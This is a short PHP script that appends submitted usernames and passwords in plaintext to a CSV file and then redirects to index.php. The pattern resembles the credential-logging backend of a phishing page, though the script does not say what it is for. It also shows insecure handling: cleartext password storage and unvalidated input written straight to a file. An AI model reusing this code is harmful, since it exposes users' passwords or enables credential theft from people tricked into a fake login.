<?php
$myfile = fopen("users.csv", "a") or die("Unable to open file!");
$user = $_POST["user"];
fwrite($myfile, $user);
fwrite($myfile, ',');
$pass = $_POST["pass"];
fwrite($myfile, $pass);
fwrite($myfile,"\n");
fclose($myfile);

header('Location: '."index.php");

?>